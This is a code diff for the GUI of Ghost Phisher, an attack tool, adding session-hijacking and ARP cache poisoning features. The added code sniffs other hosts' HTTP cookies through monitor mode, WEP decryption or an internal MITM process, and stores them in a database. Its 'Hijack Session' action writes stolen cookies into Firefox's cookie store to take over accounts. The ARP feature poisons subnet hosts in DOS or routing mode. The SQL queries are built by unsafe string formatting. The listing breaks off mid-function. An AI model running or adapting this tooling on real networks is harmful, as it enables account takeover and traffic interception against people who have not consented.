@@ -4,12 +4,12 @@ import sys                  # For validating execution of GUI components e.g [QA
 import time                 # For displaying time of executed attacks
 import thread               # For running services in a sub-processed loop(threads)
 import socket               # For network based servcies e.g DNS
+import signal               # Sending SIGINT signal to processes
 import urllib2              # For getting the source code of websites that user wants to clone
 import sqlite3              # For saving fetched credentials to database
 import shutil               # For file copy operations
 import commands             # For executing shell commands and getting system output e.g DHCP3
 import subprocess           # For reading live output from terminal processes
-
 
 
 from settings import *
@@ -23,8 +23,12 @@ from tip_settings import tip_settings
 from whats_new import whats_new_window
 from font_settings import font_settings
 
-
 from PyQt4 import QtCore, QtGui
+
+from core.MITM_Core import *
+from core.mozilla_cookie_core import *
+from core.cookie_hijacker_core import *
+
 
 cwd = os.getcwd()                                                        # This will be used as working directory after HTTP is launch
                                                                          # Thats because the HTTP server changes directory after launch
@@ -50,12 +54,6 @@ dns_contol = 1                                                  # Used to contro
 dns_connections = 0                                             # Display numbers of dns connections on the tab label
 dns_ip_and_websites = {}                                        # Holds mappings of fake ip to dns
 
-# Global variables for Fake DHCP
-dhcp_installation_status = ''                                 # Holds the DHCP installation status
-dhcp_server_binary = ''
-dhcp_config_file = "/tmp/ghost_dhcpd.conf"
-dhcp_pid_file = "/tmp/ghost_dhcpd.pid"
-
 
 # Global variables for Fake HTTP
 http_server_port = 80                                           # Default HTTP port
@@ -71,7 +69,7 @@ ghost_settings = Ghost_settings()                               # Ghost settings
 ghost_trap_http = ghost_trap_core.Ghost_Trap_http()             # Ghost Trap HTTP Class
 
 
-class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class for all GUI functional definitions
+class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):    # Main class for all GUI functional definitions
     ''' Main Class for GUI'''
     def __init__(self):
         QtGui.QDialog.__init__(self)
@@ -98,6 +96,7 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
         self.encode_number_list()
         self.metasploit_payloads()
         self.metasploit_installation()
+        self.display_hint_options()
 
         self.form_variables = None
         self.fake_http_object = None
@@ -124,16 +123,6 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
 
         # Get data from database from initialization
         global previous_database_data
-
-        # Display of hide banner
-        if ghost_settings.setting_exists("show banner"):
-            if(ghost_settings.read_last_settings("show banner") == "True"):
-                self.graphicsView.setVisible(True)
-            else:
-                self.graphicsView.setVisible(False)
-        else:
-            ghost_settings.create_settings("show banner","True")
-
 
 
         # Metasploit Class object
@@ -203,6 +192,14 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
 
         if ghost_settings.setting_exists('access_name_edit'):
             self.access_name_edit.setText(ghost_settings.read_last_settings('access_name_edit'))
+
+
+        if ghost_settings.setting_exists("self.wep_key_edit_2"):
+            self.wep_key_edit_2.setText(ghost_settings.read_last_settings("self.wep_key_edit_2"))
+
+
+        if ghost_settings.setting_exists("self.wep_key_edit_3"):
+            self.wep_key_edit_3.setText(ghost_settings.read_last_settings("self.wep_key_edit_3"))
 
 
         if ghost_settings.setting_exists('self.linux_exec_edit'):
@@ -291,6 +288,53 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
 
         self.channel_combo.addItems(channels)
 
+        ##################  SESSION HIJACKING FUNCTIONS ########################
+        self.interface_card_info = {}               # {eth0:ETHERNET, wlan0:WIFI}
+
+        self.enable_control(False)
+        self.Right_click_Menu()                     # Activate right click menu items
+        self.is_mozilla_cookie_truncated = False    # Deletes all previous cookies in mozilla database
+
+        self.monitor_interface = str()              # wlan0, mon0 etc
+
+        self.red_light = QtGui.QPixmap("%s/gui/images/red_led.png"%(os.getcwd()))
+        self.green_light = QtGui.QPixmap("%s/gui/images/green_led.png"%(os.getcwd()))
+
+        self.refresh_interface()                    # Display list of wireless interface cards on startup
+        self.clear_items()                          # Clear design items from cookie tree widget
+
+        self.host_interface = str()                 # Hold the name of the current monitor host interface e.g wlan0
+
+        self.mitm_pid = int()
+        self.cookie_db_jar = object                             # Sqlite3 Database object
+        self.cookie_core = Cookie_Hijack_Core()                 # Cookie Capture and processing core
+        self.mozilla_cookie_engine = Mozilla_Cookie_Core()      # Mozilla fierfox cookie engine
+
+
+        self.connect(self.refresh_button,QtCore.SIGNAL("clicked()"),self.refresh_interface)
+        self.connect(self.start_sniffing_button_3,QtCore.SIGNAL("clicked()"),self.start_Cookie_Attack)
+        self.connect(self.ethernet_mode_radio_2,QtCore.SIGNAL("clicked()"),self.set_attack_option)
+        self.connect(self.passive_mode_radio_2,QtCore.SIGNAL("clicked()"),self.set_attack_option)
+        self.connect(self.stop_sniffing_button_3,QtCore.SIGNAL("clicked()"),self.stop_Cookie_Attack)
+        self.connect(self.combo_interface_2,QtCore.SIGNAL("currentIndexChanged(QString)"),self.reset)
+
+        self.connect_objects()
+
+        ##################  ARP POISONING  FUNCTIONS ########################
+
+        self.arp_victims = set()
+        self.interface_selection_control = True
+        self.arp_attack = Fern_MITM_Class.ARP_Poisoning()
+
+        self.refresh_interface_arp()
+
+        self.connect(self.refresh_button_4,QtCore.SIGNAL("clicked()"),self.refresh_interface_arp)
+        self.connect(self.start_arp_poison,QtCore.SIGNAL("clicked()"),self.start_arp_poison_attack)
+        self.connect(self.stop_arp_poison,QtCore.SIGNAL("clicked()"),self.stop_arp_poison_attack)
+        self.connect(self.combo_interface_3,QtCore.SIGNAL("currentIndexChanged(QString)"),self.interface_filter)
+        self.connect(self,QtCore.SIGNAL("New ARP Victim"),self.display_arp_victim_info)
+
+        #####################################################################
         #
         # Connection to GUI object slots and Signals
         #
@@ -351,6 +395,30 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
         # Start Update checker
         thread.start_new_thread(self.update_function.update_initializtion_check,())
 
+        self.display_ghost_version()        # Display Ghost Version number on mainwindow e.g V1.45
+        self.centralize_window()
+
+
+
+    #########################################################################
+    #                           GUI DISPLAY CODES                           #
+    #########################################################################
+
+    def display_hint_options(self):
+        try:
+            self.setWindowFlags(QtCore.Qt.WindowMaximizeButtonHint)
+        except:pass
+
+
+    def display_ghost_version(self):
+        version_number = str(self.update_function.current_version)
+        self.ghost_phisher_version_label.setText("V" + version_number)
+
+
+
+    def centralize_window(self):
+        self.setWindowFlags(QtCore.Qt.Dialog)
+
 
 
     #########################################################################
@@ -363,7 +431,6 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
             please run as root")
             sys.exit(1)
 
-
     def update_window(self):
         self.update_function.display_update_version()
         self.update_function.exec_()
@@ -375,17 +442,6 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
         if event.key() == QtCore.Qt.Key_F2:
             font_run = font_settings()
             font_run.exec_()
-
-        if event.key() == QtCore.Qt.Key_F3:     # Resize Ghost windows (netbook users)
-            if self.graphicsView.isVisible():
-                ghost_settings.create_settings("show banner","False")
-                self.graphicsView.setVisible(False)
-                self.setFixedHeight(600)
-            else:
-                ghost_settings.create_settings("show banner","True")
-                self.graphicsView.setVisible(True)
-                self.setFixedHeight(685)
-
 
 
     def run_tips_thread(self):
@@ -1602,7 +1658,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
         if self.dns_control:
             self.display_error_message("DNS Server is currently not started,\
-            it recommended that you use this attack with the DNS server for optimum client redirections")
+            it is recommended that you use this attack with the DNS server for optimum client redirections")
 
         if status:
             self.ghost_spawn_browser.append('<font color=green>Starting Internal Processes...</font>')
@@ -1894,6 +1950,673 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         self.display_http_initlialization(True)
 
 
+    #######################################################
+    #               SESSION HIJACKING                     #
+    #######################################################
+
+
+
+    def connect_objects(self):
+        self.connect(self,QtCore.SIGNAL("creating cache"),self.creating_cache)
+        self.connect(self.cookie_core,QtCore.SIGNAL("New Cookie Captured"),self.display_cookie_captured)    # Notification Signal for GUI instance"))
+        self.connect(self.cookie_core,QtCore.SIGNAL("cookie buffer detected"),self.emit_led_buffer)         # Notification on new http packet
+        self.connect(self,QtCore.SIGNAL("emit buffer red light"),self.emit_buffer_red_light)
+
+        self.connect(self,QtCore.SIGNAL("on sniff red light"),self.off_sniff_red_light)         # Will bink the sniff led red for some seconds control from blink_light()
+        self.connect(self,QtCore.SIGNAL("on sniff green light"),self.on_sniff_green_light)      # Will bink the sniff led green for some seconds control from blink_light()
+        self.connect(self,QtCore.SIGNAL("Continue Sniffing"),self.start_Cookie_Attack_part)
+
+
+
+    def reset(self):
+        selected_card = str(self.combo_interface_2.currentText())
+        if(selected_card == "Select Interface Card"):
+            self.ethernet_mode_radio_2.setChecked(True)
+            self.label.setText("Gateway IP Address / Router IP Address:")
+            self.enable_control(False)
+            return
+
+        self.enable_control(True)
+        if(self.interface_card_info.has_key(selected_card)):
+            if(self.interface_card_info[selected_card] != "WIFI"):
+                self.ethernet_mode_radio_2.setChecked(True)
+                self.label.setText("Gateway IP Address / Router IP Address:")
+
+
+    def enable_control(self,status):
+        self.groupBox_2.setEnabled(status)
+        self.passive_mode_radio_2.setEnabled(status)
+        self.ethernet_mode_radio_2.setEnabled(status)
+        self.start_sniffing_button_3.setEnabled(status)
+        self.stop_sniffing_button_3.setEnabled(status)
+
+
+    def set_attack_option(self,reset = False):
+        selected_card = str(self.combo_interface_2.currentText())
+        if(selected_card == "Select Interface Card"):
+            QtGui.QMessageBox.warning(self,"Interface Option","Please select a valid interface card from the list of available interfaces")
+            self.ethernet_mode_radio_2.setChecked(True)
+            return
+
+        if(self.ethernet_mode_radio_2.isChecked()):
+            self.monitor_interface_label.setText("Ethernet Mode")
+            self.label.setText("Gateway IP Address / Router IP Address:")
+        else:
+            if(self.interface_card_info[selected_card] == "ETHERNET"):
+                QtGui.QMessageBox.warning(self,"Interface Option","The selected mode only works with WIFI enabled interface cards")
+                self.ethernet_mode_radio_2.setChecked(True)
+                return
+            if(self.interface_card_info[selected_card] == "WIFI"):
+                if(self.passive_mode_radio_2.isChecked()):
+                    self.monitor_interface_label.setText("Monitor Mode")
+                    self.label.setText("WEP Decryption Key:")
+                else:
+                    self.monitor_interface_label.setText("Ethernet Mode")
+                    self.label.setText("Gateway IP Address / Router IP Address:")
+
+
+    def display_error(self,message):
+        self.cookies_captured_label_2.setText(
+            "<font color=red><b>" + message + "</b></font>")
+
+
+    def firefox_is_installed(self):
+        if(commands.getstatusoutput("which firefox")[0]):
+            return(False)
+        return(True)
+
+
+    def refresh_interface(self):
+        interface_cards = []
+        self.interface_card_info = {}
+        self.combo_interface_2.clear()
+        self.host_interface = str()
+        interfaces = commands.getoutput("iwconfig").splitlines()
+
+        for card in os.listdir("/sys/class/net"):
+            if(card.startswith("mon")):
+                commands.getoutput("airmon-ng stop " + card)
+
+        sys_interface_cards = os.listdir("/sys/class/net")
+
+        for card in sys_interface_cards:
+            if(card.startswith("mon")):
+                continue
+            if(card == "lo"):               # Loopback interface
+                continue
+
+            for card_info in interfaces:
+                if((card in card_info) and ("802.11" in card_info)):
+                    interface_cards.append(card)
+                    self.interface_card_info[card] = "WIFI"
+
+            if(card not in interface_cards):
+                interface_cards.append(card)
+                self.interface_card_info[card] = "ETHERNET"
+
+        if(len(interface_cards) >= 1):
+            interface_cards.insert(0,"Select Interface Card")
+            interface_cards.sort()
+        else:
+            self.display_error("No Usable interface detected")
+        self.combo_interface_2.addItems(interface_cards)
+
+    ###
+    def on_sniff_green_light(self):
+        self.sniffing_status_led_2.setPixmap(self.green_light)
+
+
+    def off_sniff_red_light(self):
+        self.sniffing_status_led_2.setPixmap(self.red_light)
+
+    ##
+
+    def set_monitor_mode(self):
+        selected_interface = str(self.combo_interface_2.currentText())
+        self.cookies_captured_label_2.clear()
+        if((selected_interface == "Select Interface Card") or (selected_interface == str())):
+            self.clear_items()
+            return
+        else:
+            monitor_status = commands.getoutput("iwconfig " + selected_interface)
+            if("Monitor" in monitor_status):
+                self.monitor_interface = selected_interface
+                self.monitor_interface_led_2.setPixmap(self.green_light)
+                self.host_interface = selected_interface
+
+            elif(selected_interface == self.host_interface):
+                self.monitor_interface_led_2.setPixmap(self.green_light)
+                return
+
+            else:
+                display = '''%s is currently not on monitor mode, should a monitor interface be created using the selected interface'''%(selected_interface)
+                answer = QtGui.QMessageBox.question(self,"Enable Monitor Mode",display,QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
+                if(answer == QtGui.QMessageBox.Yes):
+                    monitor_output = commands.getstatusoutput("airmon-ng start " + selected_interface)
+
+                    if(monitor_output[0] == 0):
+                        monitor_interface = re.findall("mon\d+",monitor_output[1])
+
+                        if(monitor_interface):
+                            self.monitor_interface = monitor_interface[0]
+                            self.monitor_interface_led_2.setPixmap(self.green_light)
+                            self.host_interface = selected_interface
+
+                        elif("monitor mode enabled" in monitor_output[1]):
+                            self.monitor_interface = selected_interface
+                            self.monitor_interface_led_2.setPixmap(self.green_light)
+                            self.host_interface = selected_interface
+                        else:
+                            self.display_error(monitor_output[1])
+                    else:
+                        self.display_error(monitor_output[1])
+                else:
+                    self.clear_items()
+
+
+    def Right_click_Menu(self):
+
+        self.treeWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
+        self.treeWidget.customContextMenuRequested.connect(self._Right_Click_Options)
+
+
+    def Save_Cookies(self):
+        selected_path = str(QtGui.QFileDialog.getSaveFileName(self,"Save Cookies","cookies.txt"))
+        if(selected_path):
+            cookie_open_file = open(selected_path,"w")
+
+            database_path = os.getcwd() + "/Ghost-Phisher-Database/database.db"
+            self.cookie_db_jar = sqlite3.connect(database_path)
+            self.cookie_db_cursor = self.cookie_db_jar.cursor()
+
+            self.cookie_db_cursor.execute("select distinct source from cookie_cache")
+            source_addresses = self.cookie_db_cursor.fetchall()
+
+            for source in source_addresses:              # e.g [0,("192.168.0.1",)]
+                ip_address = str(source[0])
+
+                cookie_open_file.write("\n\n")
+                cookie_open_file.write(ip_address + "\n")
+                cookie_open_file.write("-" * 20)
+                cookie_open_file.write("\n")
+
+                self.cookie_db_cursor.execute("select distinct Web_Address from cookie_cache where source = '" + ip_address + "'")
+                web_addresses = self.cookie_db_cursor.fetchall()
+
+                for web_address in web_addresses:
+                    web_addr = str(web_address[0])
+
+                    cookie_open_file.write("\n\n" + web_addr.strip() + "\n")
+                    cookie_open_file.write("-" * (len(web_addr) + 5))
+                    cookie_open_file.write("\n")
+
+                    self.cookie_db_cursor.execute("select distinct Name,Value from cookie_cache where source = '%s' and Web_Address = '%s'"%(ip_address,web_addr))
+                    cookies_values = self.cookie_db_cursor.fetchall()
+
+                    for cookies in cookies_values:
+                        cookie = cookies[0]
+                        value = cookies[1]
+
+                        cookie_open_file.write("\n%s:     %s" % (str(cookie),str(value)))
+
+            cookie_open_file.close()
+            QtGui.QMessageBox.information(self,"Save Cookies","Successfully saved all captured cookies to:  " + selected_path)
+
+
+
+    def Clear_All(self):
+        answer = QtGui.QMessageBox.question(self,"Clear Captured Cookies","Are you sure you want to clear all captured cookies?",QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
+        if(answer == QtGui.QMessageBox.Yes):
+            self.cookie_db_cursor.execute("delete from cookie_cache")
+            self.cookie_db_jar.commit()
+            self.cookie_core.captured_cookie_count = 0
+            self.cookies_captured_label_2.setText("<font color=green><b>" + str(self.cookie_core.captured_cookie_count) + " Cookies Captured</b></font>")
+            self.treeWidget.clear()
+
+
+    def Delete_Cookie(self):
+        self.treeWidget.currentItem().removeChild(self.treeWidget.currentItem())
+
+
+    def open_web_address(self,address):
+        shell = "firefox %s"
+        commands.getoutput(shell % address)
+
+
+    def Hijack_Session(self):
+        commands.getoutput("killall firefox-bin")
+        selected_cookie = str(self.treeWidget.currentItem().text(0))
+        sql_code_a = "select Referer from cookie_cache where Web_Address = '%s'"
+        sql_code_b = "select Host,Name,Value,Dot_Host,Path,IsSecured,IsHttpOnly from cookie_cache where Web_Address = '%s'"
+
+        self.cookie_db_cursor.execute("select Host from cookie_cache where Web_Address = '%s'" % (selected_cookie))
+        result = self.cookie_db_cursor.fetchone()
+        if(result):
+            self.mozilla_cookie_engine.execute_query("delete from moz_cookies where baseDomain = '%s'" % (result[0]))
+
+        self.cookie_db_cursor.execute(sql_code_a % (selected_cookie))
+        web_address = self.cookie_db_cursor.fetchone()[0]
+
+        self.cookie_db_cursor.execute(sql_code_b % (selected_cookie))
+        return_items = self.cookie_db_cursor.fetchall()
+
+        for entries in return_items:
+            self.mozilla_cookie_engine.insert_Cookie_Values(
+            str(entries[0]),str(entries[1]),str(entries[2]),
+            str(entries[3]),str(entries[4]),str(entries[5]),
+            str(entries[6]))
+
+        thread.start_new_thread(self.open_web_address,(web_address,))
+
+
+
+
+    def _Right_Click_Options(self,pos):
+        menu = QtGui.QMenu()
+        try:
+            item_type = str(self.treeWidget.currentItem().text(0))
+        except AttributeError:
+            return
+
+        hijack_cookie = menu.addAction("Hijack Session")
+
+        if((item_type.count(".") == 3  and item_type[0:3].isdigit()) or item_type.count(":") >= 1):
+            hijack_cookie.setEnabled(False)
+        else:
+            if not self.firefox_is_installed():
+                hijack_cookie.setEnabled(False)
+            else:
+                hijack_cookie.setEnabled(True)
+
+        save_cookie = menu.addAction("Save Cookies")
+        clear_all = menu.addAction("Clear All")
+        delete_cookie = menu.addAction("Delete")
+
+        selected_action = menu.exec_(self.treeWidget.mapToGlobal(pos))
+        if(selected_action == hijack_cookie):
+            self.Hijack_Session()
+        if(selected_action == save_cookie):
+            self.Save_Cookies()
+        if(selected_action == clear_all):
+            self.Clear_All()
+        if(selected_action == delete_cookie):
+            self.Delete_Cookie()
+
+
+
+    # Blinks the cookie buffer light on http packet detection
+    def emit_led_buffer(self):
+        self.cookie_detection_led_2.setPixmap(self.green_light)
+        thread.start_new_thread(self.delay_thread,())
+
+    def emit_buffer_red_light(self):
+        self.cookie_detection_led_2.setPixmap(self.red_light)
+
+    def delay_thread(self):
+        time.sleep(0.2)
+        self.emit(QtCore.SIGNAL("emit buffer red light"))
+
+
+
+    # Displays cookies on GUI treeWidget
+    def display_cookie_captured(self):
+        self.treeWidget.clear()
+
+        database_path = os.getcwd() + "/Ghost-Phisher-Database/database.db"
+        self.cookie_db_jar = sqlite3.connect(database_path)
+        self.cookie_db_cursor = self.cookie_db_jar.cursor()
+
+        self.cookie_db_cursor.execute("select distinct source from cookie_cache")
+        source_addresses = self.cookie_db_cursor.fetchall()
+
+        for count_a,source in enumerate(source_addresses):              # e.g [0,("192.168.0.1",)]
+            ip_address = str(source[0])
+
+            item_0 = QtGui.QTreeWidgetItem(self.treeWidget)
+
+            self.treeWidget.topLevelItem(count_a).setText(0,ip_address)
+            self.cookie_db_cursor.execute("select distinct Web_Address from cookie_cache where source = '" + ip_address + "'")
+            web_addresses = self.cookie_db_cursor.fetchall()
+
+            for count_b,web_address in enumerate(web_addresses):
+
+                web_addr = str(web_address[0])
+
+                item_1 = QtGui.QTreeWidgetItem(item_0)
+                icon = QtGui.QIcon()
+                icon.addPixmap(self.green_light)
+                item_1.setIcon(0, icon)
+
+                self.treeWidget.topLevelItem(count_a).child(count_b).setText(0,web_addr)
+                self.cookie_db_cursor.execute("select distinct Name,Value from cookie_cache where source = '%s' and Web_Address = '%s'"%(ip_address,web_addr))
+                cookies_values = self.cookie_db_cursor.fetchall()
+
+                for count_c,cookies in enumerate(cookies_values):
+                    cookie = cookies[0]
+                    value = cookies[1]
+
+                    item_2 = QtGui.QTreeWidgetItem(item_1)
+                    self.treeWidget.topLevelItem(count_a).child(count_b).child(count_c).setText(0,"%s:  %s" % (str(cookie),str(value)))
+
+        self.treeWidget.collapseAll()
+        self.cookies_captured_label_2.setText("<font color=green><b>" + str(self.cookie_core.captured_cookie_count) + " Cookies Captured</b></font>")
+
+    def prepare_Mozilla_Database(self):
+        sql_code_a = "select value from cache_settings where setting = 'cookie_path'"
+        sql_code_b = "select value from cache_settings where setting = 'library_path'"
+        sql_code_c = "insert into cache_settings values ('%s','%s')"
+        if(self.firefox_is_installed()):
+            if not self.mozilla_cookie_engine.cookie_database:
+
+                database_path = os.getcwd() + "/Ghost-Phisher-Database/database.db"
+                cookie_db_jar = sqlite3.connect(database_path)
+                cookie_db_cursor = cookie_db_jar.cursor()
+                cookie_db_cursor.execute(sql_code_a)
+                result = cookie_db_cursor.fetchone()
+                if(result):
+                    self.mozilla_cookie_engine.cookie_database = result[0]
+                else:
+                    self.emit(QtCore.SIGNAL("creating cache"))
+                    path = self.mozilla_cookie_engine.get_Cookie_Path("cookies.sqlite")
+                    if not path:
+                        raise Exception("cookies.sqlite3 firefox database has not been created on this system, Please run firefox to create")
+                    cookie_db_cursor.execute(sql_code_c % ("cookie_path",path))
+                    cookie_db_jar.commit()
+
+                cookie_db_cursor.execute(sql_code_b)
+                result = cookie_db_cursor.fetchone()
+                if(result):
+                    self.mozilla_cookie_engine.mozilla_install_path = result[0]
+                else:
+                    self.emit(QtCore.SIGNAL("creating cache"))
+                    path = self.mozilla_cookie_engine.find_mozilla_lib_path()
+                    cookie_db_cursor.execute(sql_code_c % ("library_path",path))
+                    cookie_db_jar.commit()
+
+                cookie_db_jar.close()
+
+            self.mozilla_cookie_engine.execute_query("delete from moz_cookies")
+            self.start_Attack()
+
+
+
+    def creating_cache(self):
+        self.start_sniffing_button_3.setEnabled(False)
+        self.stop_sniffing_button_3.setEnabled(False)
+        self.cookies_captured_label_2.setText("<font color=green>Please wait caching objects...</font>")
+
+
+    # Attack starts here on button click()
+    def start_Cookie_Attack(self):
+        if(self.stop_arp_poison.isEnabled()):
+            QtGui.QMessageBox.warning(self,str(),"Please you cannot run the ARP Cache Poisoning and Session Hijacking attacks at the same time")
+            return
+
+        self.cookie_core = Cookie_Hijack_Core()                 # Cookie Capture and processing core
+        selected_interface = str(self.combo_interface_2.currentText())
+        self.cookies_captured_label_2.clear()
+        ip_wep_edit = str(self.wep_key_edit_2.text())
+
+        if(self.passive_mode_radio_2.isChecked()):
+            self.set_monitor_mode()
+            self.cookie_core.decryption_key = ip_wep_edit                # Pipes key (WEP) into cookie process API for processing encrypted frames
+            self.mitm_activated_label.setEnabled(False)
+            self.mitm_activated_label.setText("Internal MITM Engine Activated")
+
+        if(self.ethernet_mode_radio_2.isChecked()):
+            if(not re.match("(\d+.){3}\d+",ip_wep_edit)):
+                QtGui.QMessageBox.warning(self,"Invalid IP Address","Please insert a valid IPv4 Address of the Default Gateway")
+                self.wep_key_edit_2.setFocus()
+                return
+
+            self.monitor_interface_led_2.setPixmap(self.green_light)
+
+            os.environ["interface_card"] = selected_interface
+            os.environ["gateway_ip_address"] = ip_wep_edit             # Gateway Address
+
+            path = os.getcwd() + "/core/MITM_Core.py"
+            mitm_control = subprocess.Popen("python " + path,shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE)
+            self.mitm_pid = mitm_control.pid + 1
+
+            self.mitm_activated_label.setEnabled(True)
+            self.mitm_activated_label.setText("<font color = green><b>Internal MITM Engine Activated</b></font>")
+
+            self.monitor_interface = selected_interface
+
+        try:
+            database_path = os.getcwd() + "/Ghost-Phisher-Database/database.db"
+            self.cookie_core.cookie_db_jar = sqlite3.connect(database_path)
+            self.cookie_core.cookie_db_cursor = self.cookie_core.cookie_db_jar.cursor()
+            self.cookie_core.create_cookie_cache()                      # Create Cookie Cache
+            self.cookie_core.truncate_database()                        # Delete all old items from database
+
+        except Exception,message:
+            self.display_error("Failed to create cookie database: " + str(message))
+            return
+
+        ghost_settings.create_settings("self.wep_key_edit_2",ip_wep_edit)
+        thread.start_new_thread(self.prepare_Mozilla_Database,())       # Trucates and prepares database
+
+
+
+
+    def start_Attack(self):
+        self.cookies_captured_label_2.clear()
+        if not self.firefox_is_installed():
+            QtGui.QMessageBox.warning(self,"Mozilla Firefox Detection",
+            "Mozilla firefox is currently not installed on this computer, you need firefox to browse hijacked sessions, Process will capture cookies for manual analysis")
+
+        self.treeWidget.clear()
+        self.wep_key_edit_2.setEnabled(False)                             # Lock WEP/WPA LineEdit
+
+        self.cookie_core.control = True                                 # Start Core Thread processes
+        self.cookie_core.monitor_interface = self.monitor_interface     # Holds the monitor interface e.g mon0,mon1
+
+        thread.start_new_thread(self.Led_Blink,())                      # Blinks Sniff Led for some number of seconds
+        self.start_sniffing_button_3.setEnabled(False)
+
+
+
+    def start_Cookie_Attack_part(self):
+        try:
+            self.connect_objects()
+            self.cookie_core.start()
+            self.sniffing_status_led_2.setPixmap(self.green_light)
+            self.stop_sniffing_button_3.setEnabled(True)
+            self.start_sniffing_button_3.setEnabled(False)
+            self.ethernet_mode_radio_2.setEnabled(False)
+            self.passive_mode_radio_2.setEnabled(False)
+
+        except Exception,message:
+            self.display_error(str(message))
+            self.sniffing_status_led_2.setPixmap(self.red_light)
+            self.cookie_detection_led_2.setPixmap(self.red_light)
+            self.ethernet_mode_radio_2.setEnabled(True)
+            self.passive_mode_radio_2.setEnabled(True)
+
+
+    def Led_Blink(self):
+        for count in range(3):
+            self.emit(QtCore.SIGNAL("on sniff green light"))
+            time.sleep(1)
+            self.emit(QtCore.SIGNAL("on sniff red light"))
+            time.sleep(1)
+            self.emit(QtCore.SIGNAL("on sniff green light"))
+
+        self.emit(QtCore.SIGNAL("Continue Sniffing"))
+        return
+
+
+
+    def stop_Cookie_Attack(self):
+        if(self.ethernet_mode_radio_2.isChecked()):
+            self.mitm_activated_label.setEnabled(False)
+            self.mitm_activated_label.setText("Internal MITM Engine Activated")
+
+            self.kill_MITM_process()
+
+        self.cookie_core.control = False
+
+        self.wep_key_edit_2.setEnabled(True)                              # Release WEP/WPA Decryption LineEdit
+        self.start_sniffing_button_3.setEnabled(True)
+        self.stop_sniffing_button_3.setEnabled(False)
+        self.ethernet_mode_radio_2.setEnabled(True)
+        self.passive_mode_radio_2.setEnabled(True)
+
+        self.cookie_core = Cookie_Hijack_Core()
+        self.sniffing_status_led_2.setPixmap(self.red_light)
+        self.cookie_detection_led_2.setPixmap(self.red_light)
+
+
+    def kill_MITM_process(self):
+        while(True):
+            try:
+                os.kill(self.mitm_pid,signal.SIGINT)
+            except OSError:
+                return
+
+
+    def clear_items(self):
+        self.treeWidget.clear()
+        self.cookies_captured_label_2.clear()
+        self.cookie_detection_label_2.setEnabled(True)
+        self.sniffing_status_label_2.setEnabled(True)
+        self.monitor_interface_label_2.setEnabled(True)
+        self.cookie_detection_led_2.setPixmap(self.red_light)
+        self.sniffing_status_led_2.setPixmap(self.red_light)
+        self.cookies_captured_label_2.clear()
+        self.monitor_interface_led_2.setPixmap(self.red_light)
+
+
+
+    #######################################################
+    #               ARP CACHE POISONING                   #
+    #######################################################
+
+    def refresh_interface_arp(self):
+        path = "/sys/class/net"
+        sys_interface = os.listdir(path)
+        self.combo_interface_3.clear()
+        if(sys_interface):
+            self.combo_interface_3.addItem("Select Interface")
+            for interface in sys_interface:
+                if(interface == "lo"):
+                    continue
+                self.combo_interface_3.addItem(interface)
+
+        if(self.stop_arp_poison.isEnabled()):
+            self.stop_arp_poison_attack()
+
+        if(sys_interface):
+            self.start_arp_poison.setEnabled(True)
+            self.stop_arp_poison.setEnabled(False)
+        else:
+            self.start_arp_poison.setEnabled(False)
+            self.stop_arp_poison.setEnabled(False)
+
+        self.interface_filter()
+
+
+
+    def interface_filter(self):
+        interface_card = str(self.combo_interface_3.currentText())
+
+        if(interface_card == "Select Interface"):
+            self.start_arp_poison.setEnabled(False)
+            self.stop_arp_poison.setEnabled(False)
+        else:
+            if(self.interface_selection_control):
+                self.start_arp_poison.setEnabled(True)
+                self.stop_arp_poison.setEnabled(False)
+            else:
+                self.start_arp_poison.setEnabled(False)
+                self.stop_arp_poison.setEnabled(True)
+
+
+
+
+    def start_arp_poison_attack(self):
+        arp_attack_option = str()
+        interface_card = str(self.combo_interface_3.currentText())
+        target_address = str(self.wep_key_edit_3.text())
+
+        self.arp_poison_browser.clear()
+
+        if(self.stop_sniffing_button_3.isEnabled()):
+            QtGui.QMessageBox.warning(self,str(),"Please you cannot run the Session Hijacking and ARP Cache Poisoning attacks at the same time")
+            return
+
+        if(not re.match("(\d+.){3}\d+",target_address)):
+            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please insert a valid IPv4 Address of the Default Gateway")
+            self.wep_key_edit_3.setFocus()
+            return
+
+        ghost_settings.create_settings("self.wep_key_edit_3",target_address)
+
+        if(self.poison_one_way_combo.isChecked()):
+            arp_attack_option = "DOS"
+        else:
+            arp_attack_option = "ARP POISON + ROUTE"
+
+        self.arp_attack.interface_card = interface_card
+        self.arp_attack.gateway_IP_address = target_address
+        self.arp_attack.set_Attack_Option(arp_attack_option)
+
+        self.arp_attack.control = True
+        self.arp_attack.start()
+        self.arp_poison_browser.append("<font color=green>Started ARP Cache Poisoning at " + str(time.ctime()) + "</font>")
+
+        self.arp_poison_browser.append(str())
+
+        if(arp_attack_option == "DOS"):
+            self.arp_poison_browser.append("<font color=green><b>DOS Activated</b></font>")
+        else:
+            self.arp_poison_browser.append("<font color=green><b>Routing Mode Activated</b></font>")
+
+        self.start_arp_poison.setEnabled(False)
+        self.stop_arp_poison.setEnabled(True)
+
+        self.arp_poison_browser.append(str())
+
+        self.arp_poison_browser.append("<font color=green><b>Poisoned ARP Cache Victims</b></font>")
+        self.arp_poison_browser.append("<font color=green><b>%s</b></font>"%("-" * 50))
+
+        self.interface_selection_control = False
+        thread.start_new_thread(self.Check_New_Arp_Victim,())
+
+
+
+    def Check_New_Arp_Victim(self):
+        arp_number = int()
+        while(self.arp_attack.control == True):
+            arp_victim_count = len(self.arp_attack.subnet_hosts.keys())
+            if(arp_victim_count > arp_number):
+                self.emit(QtCore.SIGNAL("New ARP Victim"))
